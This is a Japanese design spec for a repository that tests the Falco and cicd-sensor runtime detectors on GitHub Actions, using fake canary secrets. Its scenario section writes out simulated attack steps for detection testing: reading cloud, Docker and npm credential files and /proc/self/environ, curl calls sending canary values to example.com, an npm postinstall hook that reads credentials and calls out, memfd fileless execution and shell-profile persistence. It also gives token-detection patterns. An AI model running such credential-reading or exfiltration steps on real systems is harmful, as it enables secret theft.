# cicd-runtime-testbed 仕様書

falcosecurity/falco-actions と cicd-sensor を GitHub Actions 上で実地検証するためのテスト用リポジトリの仕様。
本ファイルが実装の契約であり、実装者はここに書かれたパス・ファイル名・インタフェースを厳密に守ること。

---

## 0. 目的

以下 3 点を、実際に GitHub Actions を走らせて確認する。

| # | 検証目的 | 対応セクション |
| --- | --- | --- |
| T1 | 検知が行なわれること。cicd-sensor ではプロセス kill が実際に発生すること | §4, §5 |
| T2 | 実際にどのような情報が取得・閲覧できるか | §6 |
| T3 | public repo で動かした際に secret 情報が漏れないか | §3, §7 |

T3 は 2 つの独立した問いに分かれる。

- **T3-a**: 各漏洩経路（環境変数 / ファイル内容 / パス / argv / URL / DNS / 生キャプチャ）ごとに、
  仕込んだ**偽カナリア**が実際に漏れるか。期待値は §3 の表に定義し、
  期待と実測の乖離を `render-matrix.py` が検出する
- **T3-b**: ランナーに実在する **GitHub 発行の本物のトークン**
  （`GITHUB_TOKEN` / `ACTIONS_RUNTIME_TOKEN`）が、ツールの出力に混入するか。
  偽カナリアが漏れるのは設計上の当然だが、こちらは実際に確認する価値がある事実である。
  §7 の二次走査で検証する

---

## 1. 絶対に守る安全制約（Safety Invariants）

これに反する実装は不可。レビュー時の最優先チェック項目とする。

1. **本物の秘密情報を一切使わない。** 全カナリアは `CNRY-` プレフィックスの偽値で、リポジトリにコミットされる。
   例外は `CANARY_ENV` のみで、これは GitHub Secrets に登録するが、値は同様に偽物である。
2. **外部への実データ送信をしない。** 通信先は次の 2 つだけに限定する。
   - HTTP: `http://example.com/...`（IANA 予約ドメイン。POST 内容は破棄される）
   - DNS: `*.test.invalid`（RFC 2606 予約 TLD。**絶対に解決せず**、第三者に到達しない）
   攻撃者インフラ、実在の第三者サービス、webhook 収集サービス（webhook.site 等）は使用禁止。
3. **実在の IOC を踏まない。** cicd-sensor の `ioc.yaml` にある実際の悪性ドメイン・IP は
   テストに使わない。kill テストは §5 の専用カスタムルールで発火させる。
4. **汎用的な攻撃ツールを作らない。** 各シナリオは「観測されるべき syscall を発生させる最小のコマンド列」であり、
   実際の窃取・権限昇格・回避を行なう機能を持たせない。各スクリプト冒頭に用途を明記したヘッダコメントを置く。
5. **成果物の保持期間を最小化する。** すべての `upload-artifact` に `retention-days: 1` を明示する。
6. **危険な成果物を既定でアップロードしない。** falco analyze モードの `capture.scap` は
   §7 の漏洩検証に必要だが、既定では**アップロードしない**。`workflow_dispatch` の
   入力 `upload_raw_capture: true` を明示指定したときのみアップロードする。

   ただしこれは「明示的に有効化する運用を維持する」という意味であり、
   **public リポジトリでの実行を禁止するものではない。**
   `falco-analyze.yml` にジョブを停止するガードは置かない（§8 参照）。
   このリポジトリでは、public リポジトリで生キャプチャが公開されることの
   実害が次の理由で無視できると評価しているため:

   - `capture.scap` に入りうるカナリア値はすべて偽物で、
     `canaries/canaries.env` としてリポジトリにコミット済み。公開されても失うものがない
   - 実在する認証情報は 2 つだけ。`GITHUB_TOKEN`（宣言権限は `contents: read` のみ＝
     public リポジトリでは誰でも持つ読み取り権限に過ぎず、ジョブ完了時に失効）と、
     `ACTIONS_RUNTIME_TOKEN`（run 中のみ有効。悪用の本命経路は `actions/cache` への
     汚染だが、このリポジトリは `actions/cache` を使っていないためその経路が存在しない）
   - `id-token: write` を宣言していないため `ACTIONS_ID_TOKEN_REQUEST_TOKEN` は存在しない
   - 残るリスクは「このテストリポジトリ自身のアーティファクトを他人が上書きできるかも
     しれない」程度であり、T3 の検証価値のほうが上回る

   **この評価は上記の前提に依存する。** 次のいずれかが起きたら再評価すること。

   - リポジトリに本物の secret を追加した場合
   - `contents: write` / `packages: write` / `id-token: write` などを宣言した場合
   - `actions/cache` を使い始めた場合
   - self-hosted ランナーで実行する場合（GitHub-hosted の使い捨て VM とはジョブ間の
     分離モデルが異なる）

---

## 2. リポジトリ構成

```
cicd-runtime-testbed/
├── README.md
├── .github/workflows/
│   ├── falco-live.yml
│   ├── falco-analyze.yml
│   ├── sensor-monitor.yml
│   ├── sensor-enforce.yml
│   └── leak-scan.yml
├── .cicd-sensor/
│   ├── config.yaml
│   └── rules/
│       └── testbed.yaml
├── scenarios/
│   ├── lib/common.sh
│   ├── 00-seed.sh
│   ├── 01-credential-access.sh
│   ├── 02-exfil.sh
│   ├── 03-npm-postinstall/
│   │   ├── package.json
│   │   └── postinstall.js
│   ├── 04-persistence.sh
│   ├── 05-memfd-exec.sh
│   ├── 06-anti-forensics.sh
│   ├── 07-rule-markers.sh
│   └── 90-killme.sh
├── canaries/
│   └── canaries.env
├── tools/
│   ├── scan-leaks.sh
│   └── render-matrix.py
└── docs/
    ├── SPEC.md          ← 本ファイル
    ├── TEST-PLAN.md
    ├── SAFETY.md
    └── RESULTS-TEMPLATE.md
```

---

## 3. カナリア定義（`canaries/canaries.env`）

漏洩検証の中核。**各カナリアは「どの経路で漏れるか」を個別に切り分けるために存在する**。
形式は `KEY=VALUE` の shell source 可能な形式とし、値はすべて一意で grep 可能なこと。

| ID | 注入経路 | 値の制約 | 期待結果 | 検証する仮説 |
| --- | --- | --- | --- | --- |
| `CANARY_ENV` | 環境変数（GitHub Secrets 経由） | 任意 | **漏れない** | GH のログ自動マスキングが効く／センサーは env を収集しない |
| `CANARY_FILE` | ファイル**内容**（`~/.aws/credentials`） | 任意 | **漏れない** | 両ツールともファイル内容は読まない（パスのみ記録） |
| `CANARY_PATH` | ファイル**パス**（`/tmp/CNRY.../marker`） | 任意 | **漏れる** | cicd-sensor はパスを redact しない |
| `CANARY_ARGV_SHORT` | プロセス argv（キーワードなし・**12 バイト以下**） | 12 バイト以下／`token`,`key`,`auth`,`pass`,`secret`,`cred`,`bearer`,`AKIA`,`ghp_`,`glpat-` を**含まない** | **漏れる** | redaction ヒューリスティックのキーワード依存の穴 |
| `CANARY_ARGV_LONG` | プロセス argv（キーワードなし・13 バイト以上） | 上記キーワードを含まない | **漏れない**（`<truncated, N bytes>` になる） | 12 バイト超の切り詰めが効く |
| `CANARY_ARGV_FLAG` | プロセス argv（`--header "Authorization: Bearer <値>"`） | 任意 | **漏れない** | フラグ名ベースの redaction が効く |
| `CANARY_URL_QUERY` | 平文 HTTP の**クエリ文字列** | 任意 | **漏れない** | eBPF 内でクエリが除去される |
| `CANARY_URL_PATH` | 平文 HTTP の**パス** | 任意 | **漏れる** | HTTP path は redact 対象外 |
| `CANARY_DNS` | DNS クエリのラベル（`<値>.test.invalid`） | DNS ラベルとして妥当（英数字とハイフン、63 文字以下） | **漏れる** | ドメイン名は redact 対象外 |
| `CANARY_SCAP` | 生の syscall バッファ（`echo` の引数＋ファイル書き込み） | 200 バイト以下 | **falco の capture.scap でのみ漏れる** | snaplen 256 の生キャプチャに素通りで入る |

### 値の命名規則

- 先頭は `CNRY`。全体で一意。判別しやすいこと。
- `CANARY_ARGV_SHORT` のみ 12 バイト以下という強い制約があるため、`CNRY` + 8 文字 = 12 バイトとする。
- 各値の末尾または内部に `DO-NOT-USE` を含めたいが、`CANARY_ARGV_SHORT` は長さ制約上不可。
  長さに余裕があるものは `-DONOTUSE` を含めること。
- `CANARY_DNS` は DNS ラベル制約のため英数字とハイフンのみ。

### 重要な実装上の注意

- `canaries/canaries.env` は**リポジトリにコミットされる**ため、チェックアウトしたソースツリー内に
  これらの値が存在する。スキャナはこのファイル自身とリポジトリのソースを**スキャン対象から除外**すること。
  除外しないと全カナリアが常に「漏洩」と誤判定される。
- `CANARY_ENV` のみ GitHub Secrets に登録する。README に登録手順を書くこと。
  Secret 未設定でも他のテストが動くよう、未設定時はスキップしてその旨を記録する。

---

## 4. 検知シナリオ（`scenarios/`）

各スクリプトの要件:

- `#!/usr/bin/env bash` + `set -uo pipefail`。**`set -e` は使わない**
  （一部のコマンドは失敗が想定されるため。失敗しても後続シナリオを続ける）
- 冒頭に用途・安全性・期待される検知内容を書いたヘッダコメント
- `scenarios/lib/common.sh` を source して共通関数を使う
- 各ステップの前後に `::group::` / `::endgroup::` で GitHub Actions のログを畳む
- **終了コードは常に 0**（シナリオ自体の失敗で CI を落とさない。検証は別ジョブで行なう）

### `lib/common.sh` が提供する関数

| 関数 | 役割 |
| --- | --- |
| `load_canaries` | `canaries/canaries.env` を source する |
| `step <name>` | ログのグループ開始＋実行中シナリオ名の記録 |
| `note <msg>` | 実行した操作を `$TESTBED_LOG`（JSONL）に記録する |
| `safe_run <cmd...>` | 失敗を許容してコマンドを実行し、終了コードを記録 |

### `00-seed.sh`

後続シナリオが読む「偽クレデンシャル」を配置する。

- `~/.aws/credentials` に `CANARY_FILE` を含む偽の AWS 認証情報を書く
- `~/.docker/config.json` に偽の auth エントリを書く
- `/tmp/${CANARY_PATH}/marker` を作る（ディレクトリ名にカナリアを含める）
- `~/.npmrc` に偽の registry トークン行を書く

### `01-credential-access.sh` — クレデンシャルアクセス

- `cat ~/.aws/credentials`
- `cat ~/.docker/config.json`
- `cat ~/.npmrc`
- `cat /proc/self/environ`（他プロセスの environ は読まない。自プロセスのみ）
- GitHub Actions のランタイムトークンファイル（`$RUNNER_TEMP` 配下）の**存在確認のみ**（`ls`。中身は読まない）

期待: falco の `Suspicious Process Reading GitHub Token`、cicd-sensor の `generic-credential-access` 系が発火。

### `02-exfil.sh` — 外部送信

- DNS: `getent hosts "${CANARY_DNS}.test.invalid"` （解決失敗が正常）
- 平文 HTTP（クエリ）: `curl -s -m 5 "http://example.com/?t=${CANARY_URL_QUERY}"`
- 平文 HTTP（パス）: `curl -s -m 5 "http://example.com/${CANARY_URL_PATH}"`
- 平文 HTTP（Authorization ヘッダ）: `curl -s -m 5 -H "Authorization: Bearer ${CANARY_ARGV_FLAG}" http://example.com/`
- HTTPS 対照群: `curl -s -m 5 "https://example.com/?t=${CANARY_URL_QUERY}"`
  → **HTTPS 側は中身が取れないことの確認用**。これが取れていたら報告の前提が崩れる

### `03-npm-postinstall/` — 依存関係経由の攻撃（最重要）

**プロセス系譜の検知能力を試す中核シナリオ。** ローカルパッケージの `postinstall` から
クレデンシャルアクセスと外部通信を行なう。npm レジストリからは何も取得しない（`npm install --no-audit --no-fund ./03-npm-postinstall`）。

- `package.json` に `"postinstall": "node postinstall.js"`
- `postinstall.js` は `~/.aws/credentials` を読み、`http://example.com/` に接続する
- 期待: cicd-sensor が `npm` の子孫であることを条件に含むルールで検知する。
  falco-actions は系譜 4 世代まで output に出すが、**ルール条件としては使っていない**ため
  汎用ルールでしか引っかからないはず → **両者の表現力の差が最も明確に出る**

### `04-persistence.sh` — 永続化

- `~/.bashrc` に追記
- `.github/workflows/` 配下にファイルを作成（`_testbed_persistence.yml.disabled` という名前にし、
  **有効なワークフローにはしない**）
- `~/.ssh/authorized_keys` への追記は**行なわない**（実際の永続化に近すぎるため）

### `05-memfd-exec.sh` — fileless 実行

- `memfd_create` 経由で実行する。`python3` で `memfd_create` → 書き込み → `/proc/self/fd/N` を exec
- 実行する中身は `echo` 相当の無害なシェルスクリプト
- 期待: cicd-sensor の `process_exec.is_memfd = true` が立つ。falco 側で相当する情報が取れるか確認

### `06-anti-forensics.sh` — 証跡削除

- `00-seed.sh` が作った偽クレデンシャルを削除する
- `05` で実行したバイナリを削除する（falco の SHA256 計算が
  `File does not exist anymore` になることの確認）

### `07-rule-markers.sh` — detect / collect アクションの発火

`.cicd-sensor/rules/testbed.yaml` の `testbed_detect_marker` / `testbed_collect_marker`
に対応するマーカーファイルを書き込む。

- `cicd-sensor-detect.marker` に書き込む（`action: detect` が発火）
- `cicd-sensor-collect.marker` に書き込む（`action: collect` が発火）
- `sensor-monitor.yml` からのみ呼ばれる

これにより detect / collect / terminate の 3 アクションすべてを実地検証できる。
`collect` は Detection Log には出るが attestation predicate からは除外される
仕様になっているため、その除外を実際に確認する用途も兼ねる。

### `90-killme.sh` — kill 発火専用

- §5 のカスタムルールに一致する動作だけを行なう
- このスクリプトは `sensor-enforce.yml` からのみ呼ばれる
- 実行後に `echo "REACHED_AFTER_KILLME"` を出力する。
  **この文字列がログに出ていたら kill されなかった**ことを意味する（判定に使う）

---

## 5. cicd-sensor の kill テスト設計

### `.cicd-sensor/config.yaml`

`sensor-monitor.yml` と `sensor-enforce.yml` で `monitor_mode` を切り替える必要がある。
config.yaml は 1 つしか置けないため、**ワークフロー側で実行時に書き換える**方式とする。
リポジトリにコミットする既定値は安全側に倒し `monitor_mode: true` とすること。

```yaml
monitor_mode: true
default_max_alerts_per_rule: 50
```

### `.cicd-sensor/rules/testbed.yaml`

kill を発火させる専用ルール。**実在の IOC は使わない。**

CEL の制約に注意:
- **正規表現・添字アクセス・算術は使えない。** `==`, `endsWith`, `startsWith`, `contains` 等のみ
- フィールド名は `cicd-sensor/docs/user-guide/rule-event-types.md` に載っているものだけを使う。
  実装者はこのファイルを必ず読むこと。推測でフィールド名を書かない
- `rule_sets:` と `rule_modifiers:` は同一 YAML ドキュメントに同居できない

必要なルール:

| rule_id | event_type | 条件の方針 | action |
| --- | --- | --- | --- |
| `testbed_kill_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-killme.marker")` | `terminate` |
| `testbed_detect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-detect.marker")` | `detect` |
| `testbed_collect_marker` | `file_open` | `is_write && path.endsWith("/cicd-sensor-collect.marker")` | `collect` |

`90-killme.sh` は `cicd-sensor-killme.marker` に書き込むだけでよい。
`cicd-sensor-detect.marker` / `cicd-sensor-collect.marker` は
`07-rule-markers.sh`（§4）が書き込む。

検証は `cicd-sensorctl rule validate .cicd-sensor/rules` で行なう。ワークフローにこの検証ステップを含めること。

### 判定方法

`sensor-enforce.yml` は次の構造にする。

1. ジョブ `enforce`: `90-killme.sh` を実行する。
   - **`90-killme.sh` を実行するステップ自体に**ステップレベルの `continue-on-error: true`
     を付け、その `outcome`（本来の成否）をジョブ output として公開する
   - `REACHED_AFTER_KILLME` がログに出たかの grep 結果も、ジョブ output として公開する
   - ジョブレベルの `continue-on-error: true` も併用し、run 全体が赤くならないようにする
2. ジョブ `assert`: `needs: enforce` かつ `if: always()`。上記 2 つの output を判定する
   - `enforce` の killme ステップの `outcome` が `failure` であること（kill された証拠）
   - `REACHED_AFTER_KILLME` が**出ていない**こと
   - どちらかが満たされない場合、`assert` ジョブを失敗させる

**重要（GitHub Actions の制限）:** ジョブレベルの `continue-on-error: true` を使うと、
`needs.<job>.result` は実際の失敗結果に関わらず**常に `success` を返す**
（`actions/toolkit#1739`）。そのため判定に `needs.enforce.result` を使ってはならない。
ステップレベルの `outcome` をジョブ output 経由で受け渡すこと。

**注意:** kill されなかった場合に `assert` が失敗する設計なので、この 1 本だけは
「失敗が正常」ではなく「成功が正常」になる。README に明記すること。

---

## 6. テレメトリ収集（T2）

各ワークフローの最後に、そのツールが出した情報を**すべて**成果物として集める。

### falco-actions

- live: ジョブサマリ（`$GITHUB_STEP_SUMMARY`）と、可能なら `/tmp/falco_events.json`
- analyze: ジョブサマリ、`hashes` アーティファクト、
  `capture.scap`（§1-6 の条件付き）

### cicd-sensor

- standalone モードの HTML レポート、attestation predicate、ジョブサマリ
- Manager は構築しない（standalone のみ）。理由は導入コストと、
  本テストの目的が「GitHub-hosted で何が見えるか」であるため

### 出力

各ワークフローは `telemetry-<tool>-<mode>` という名前でアーティファクトを上げる。
`leak-scan.yml` がこれらを横断的にダウンロードして走査する。

---

## 7. 漏洩スキャナ（`tools/scan-leaks.sh` / `tools/render-matrix.py`）

### `scan-leaks.sh`

- 引数: `<スキャン対象ディレクトリ>`
- `canaries/canaries.env` を読み、各カナリア値を対象ディレクトリ配下の全ファイルから探す
- **バイナリファイル（`capture.scap` 等）も対象**。`grep -a` もしくは `strings` を使う
- **除外必須**: リポジトリのソースツリー、`canaries/` ディレクトリ、`tools/` ディレクトリ、
  スキャナ自身の出力ファイル
- 出力: `leak-report.json`（JSON）。形式は以下

```json
{
  "scanned_at": "2026-08-19T12:00:00Z",
  "run_id": "1234567890",
  "findings": [
    {
      "canary_id": "CANARY_PATH",
      "expected": "leak",
      "found": true,
      "locations": [
        {"file": "telemetry-sensor-monitor/report.html", "count": 3}
      ]
    }
  ],
  "runner_token_findings": [
    {
      "pattern": "github_token",
      "count": 2,
      "locations": [
        {"file": "telemetry-falco-analyze/capture.scap", "count": 2}
      ]
    }
  ]
}
```

- `run_id` は**走査対象の run**（`SCANNED_RUN_ID`）を記録する。
  leak-scan 自身の run（`GITHUB_RUN_ID`）ではない。
- **カナリアの実値を `leak-report.json` に書かないこと**（スキャナ出力自体が漏洩源になるため）。
  `canary_id` のみ記録する。

### 二次走査: ランナー由来トークンのパターン検出

「`capture.scap` に GitHub 発行の**本物の**トークンが実際に入るのか」は、
偽カナリアの検証とは別の、独立した検証項目である（§0 の T3 に含む）。
偽カナリアが入るのは設計上の当然だが、こちらは実際に確認する価値がある事実である。

- `leak-scan.yml` は走査対象とは**別の run** で実行されるため、実値での照合はできない。
  次の**パターン**でのみ判定する。
  - `github_token`: `ghs_` / `ghp_` / `gho_` / `ghu_` / `ghr_` に続く英数字列
  - `jwt`: `eyJ` で始まる base64url セグメントがドット区切りで 3 つ連なった形
    （`ACTIONS_RUNTIME_TOKEN` 等）
- 結果はトップレベルキー `runner_token_findings` に記録する。
  **`findings` の構造は変更しないこと**（`render-matrix.py` の既存処理を壊さないため）。
- **検出した実値は絶対に記録しない。** パターン種別・件数・ファイル名のみ。
  カナリアと同じ原則。
- 既知のカナリア値に一致するものは除外する
  （偽の `ghp_` 様カナリアが二重計上されるのを防ぐため）。
- 除外ロジック（リポジトリのソースツリー、`canaries/`、`tools/`）はカナリア走査と共通。

### `render-matrix.py`

- `leak-report.json` を読み、Markdown の表を `$GITHUB_STEP_SUMMARY` に出力する
- 各行: カナリア ID / 注入経路 / 期待 / 実測 / 判定
- 判定は `期待 == 実測` なら ✅、乖離していれば ⚠️
- **⚠️ が 1 つでもあれば非ゼロで終了する**（＝仮説と現実が食い違ったことを CI 上で目立たせる）
- `runner_token_findings` を**独立したセクション**として出力する。
  - **この結果は exit code に影響させない。** 終了コードの判定はカナリアのみを対象とする。
    ランナー由来トークンの検出は「発見」であって「失敗」ではないため
  - どのツールの出力に、どの種類のトークンが、いくつ入っていたかが読んで分かる出力にする
  - `runner_token_findings` キーが無い旧形式の JSON でも例外にせず処理を続けること
- 引数は `python3 tools/render-matrix.py <leak-report.json> [--out <出力先>]`
- Python 3 標準ライブラリのみ使用。外部依存を追加しない

---

## 8. ワークフロー仕様

全ワークフロー共通:

- トリガーは `workflow_dispatch` のみ。**`push` / `pull_request` では起動しない**
  （public repo で不用意に走らないため）
- `permissions:` は各ワークフローで明示的に最小化する
- `runs-on` は §8 の表に従う
- すべての `uses:` は**コミット SHA でピン留め**し、行末コメントにバージョンを書く
- 各ワークフローの冒頭に、そのワークフローが何を検証するかの `name:` と コメントを書く

| ワークフロー | runs-on | 目的 | 特記事項 |
| --- | --- | --- | --- |
| `falco-live.yml` | `ubuntu-latest` | falco live モードでの検知 | `falco-version` を `0.39.0` と `0.43.0` の matrix にし、**ルールの `required_engine_version: 0.43.0` との不整合が実際に問題になるかを確認**する。`fail-fast: false` |
| `falco-analyze.yml` | `ubuntu-latest` | falco analyze モードでの検知と生キャプチャ | `custom-rule-file` に CI/CD ルールを**明示的に渡す**（渡さないと効かないため）。`upload_raw_capture` 入力で scap のアップロードを制御（既定 `false`）。**ジョブを停止するガードは置かない**（§1-6）。public リポジトリで実行された場合は、`capture.scap` に何が入りうるかを `::warning::` と job summary で告知する情報提供ステップのみを置く |
| `sensor-monitor.yml` | `ubuntu-24.04` | cicd-sensor の検知（kill なし） | `monitor_mode: true`。全シナリオを実行 |
| `sensor-enforce.yml` | `ubuntu-24.04` | cicd-sensor の kill 動作 | `monitor_mode: false`。§5 の 2 ジョブ構成 |
| `leak-scan.yml` | `ubuntu-latest` | 漏洩マトリクスの生成 | 入力で対象 run_id を受け取り、その run のアーティファクトを DL して走査 |

### falco-actions / cicd-sensor-action のバージョン

- `cicd-sensor-action`: README にある `6511eb44c91d71b2b93d71193b1bf2cb18352f66`（v0.0.38）を使う
- `falco-actions`: このリポジトリにはタグがないため、**実装者は SHA を確定できない**。
  `falcosecurity/falco-actions/start@<PIN_ME>` のようにプレースホルダを置き、
  README に「利用者が SHA を確定して差し替える」旨を明記すること。**推測の SHA を書かない**

---

## 9. ドキュメント

### `README.md`

- このリポジトリが何であるか（検証用であり、production に入れるものではない）
- `upload_raw_capture` を有効にすると生キャプチャが誰でもダウンロード可能になる旨と、
  **それでも public repo で実行してよいと判断した根拠**（§1-6）、および
  **再評価が必要な条件**
- セットアップ手順（`CANARY_ENV` シークレットの登録、falco-actions の SHA 確定、
  `cicd-sensorctl` の入手経路が未検証である旨）
- 各ワークフローの実行方法と、期待される結果
- `sensor-enforce.yml` だけは「成功が正常」である旨

### `TEST-PLAN.md`

- §3 のカナリア表と §4 のシナリオ表を、実行順序とともに記述
- 各シナリオがどのツールのどのルールに対応する想定かの対応表

### `SAFETY.md`

- §1 の安全制約を、なぜそうするのかの理由付きで記述
- 「このリポジトリを fork / 流用する人が守るべきこと」の形式で書く

### `RESULTS-TEMPLATE.md`

- 実行結果を記入するためのテンプレート
- T1 / T2 / T3-a / T3-b それぞれの結果欄と、report の仮説との突き合わせ欄

---

## 10. 実装時の禁止事項

- 推測でファイルパス・フィールド名・アクション SHA を書かない。
  不明な場合はプレースホルダにして README に明記する
- `cicd-sensor` / `falco-actions` の**元リポジトリを一切変更しない**（読み取りのみ）
- 実在のマルウェア・IOC・攻撃者インフラを参照しない
- `curl | sh` 形式のインストールを書かない
- 本物の認証情報・実在サービスの API キー形式に酷似した値を使わない
  （`ghp_` 等のプレフィックスは redaction テストのため `CANARY_ARGV_FLAG` の文脈でのみ許容）
